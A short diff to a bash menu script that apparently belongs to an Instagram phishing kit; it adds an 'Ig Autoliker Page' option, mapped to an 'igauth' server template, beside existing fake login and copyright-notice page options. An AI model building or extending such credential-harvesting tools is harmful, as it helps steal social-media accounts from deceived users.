@@ -494,6 +494,8 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login P
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m copyright Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mail confirmation Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Copyright infringement Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Ig Autoliker Page\e[0m\n"
+
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' insta_option
 
@@ -511,6 +513,10 @@ start1
 
 elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
 server="cip"
+start1
+
+elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
+server="igauth"
 start1
 
 else
